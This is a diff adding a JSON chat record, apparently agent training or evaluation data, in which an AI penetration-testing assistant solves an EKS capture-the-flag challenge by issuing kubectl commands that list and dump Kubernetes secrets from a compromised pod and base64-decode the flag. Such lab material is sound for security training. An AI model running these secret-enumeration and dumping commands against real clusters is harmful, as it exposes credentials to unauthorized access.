@@ -1,0 +1,57 @@
+{
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a penetration testing assistant helping a security researcher evaluate the security of their Kubernetes cluster. Respond only with ready-to-run commands based on previous output. Do not use placeholders or commentary. Do not provide commands you already know the answer for! Commands must not require interactive mode and must help find vulnerabilities."
+      },
+      {
+        "role": "user",
+        "content": "Hints: You've hacked into a low-privileged AWS EKS pod. Use the web terminal below to find flags across the environment. Each challenge runs in a different Kubernetes namespaces with varying permissions. All K8s resources are crucial; challenges are based on real EKS misconfigurations and security issues. First challenge is called Secret Seeker. Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?\nRecon output:\n['Command: kubectl auth can-i --list \\n Output: Resources                                       Non-Resource URLs   Resource Names   Verbs\\n*.*                                             []                  []               [*]\\n                                                [*]                 []               [*]\\nselfsubjectreviews.authentication.k8s.io        []                  []               [create]\\nselfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]\\nselfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]\\n                                                [/api/*]            []               [get]\\n                                                [/api]              []               [get]\\n                                                [/apis/*]           []               [get]\\n                                                [/apis]             []               [get]\\n                                                [/healthz]          []               [get]\\n                                                [/healthz]          []               [get]\\n                                                [/livez]            []               [get]\\n                                                [/livez]            []               [get]\\n                                                [/openapi/*]        []               [get]\\n                                                [/openapi]          []               [get]\\n                                                [/readyz]           []               [get]\\n                                                [/readyz]           []               [get]\\n                                                [/version/]         []               [get]\\n                                                [/version/]         []               [get]\\n                                                [/version]          []               [get]\\n                                                [/version]          []               [get]']\nPlease begin."
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get secrets --all-namespaces -o yaml"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get secrets --all-namespaces -o yaml\nOutput:\nError from server (Forbidden): secrets is forbidden: User \"system:serviceaccount:challenge1:service-account-challenge1\" cannot list resource \"secrets\" in API group \"\" at the cluster scope"
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get pods -n challenge1"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get pods -n challenge1\nOutput:\nError from server (Forbidden): pods is forbidden: User \"system:serviceaccount:challenge1:service-account-challenge1\" cannot list resource \"pods\" in API group \"\" in the namespace \"challenge1\""
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get secret -n challenge1"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get secret -n challenge1\nOutput:\nNAME         TYPE     DATA   AGE\nlog-rotate   Opaque   1      517d"
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get secret log-rotate -n challenge1 -o yaml"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get secret log-rotate -n challenge1 -o yaml\nOutput:\napiVersion: v1\ndata:\n  flag: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==\nkind: Secret\nmetadata:\n  creationTimestamp: \"2023-11-01T13:02:08Z\"\n  name: log-rotate\n  namespace: challenge1\n  resourceVersion: \"890951\"\n  uid: 03f6372c-b728-4c5b-ad28-70d5af8d387c\ntype: Opaque"
+      },
+      {
+        "role": "assistant",
+        "content": "echo \"d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==\" | base64 -d"
+      },
+      {
+        "role": "user",
+        "content": "Command: echo \"d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==\" | base64 -d\nOutput:\nwiz_eks_challenge{omg_over_privileged_secret_access}"
+      },
+      {
+        "role": "assistant",
+        "content": "Great! You've found the flag. Let me know if you need help with another challenge."
+      }
+    ]
+  }
+  
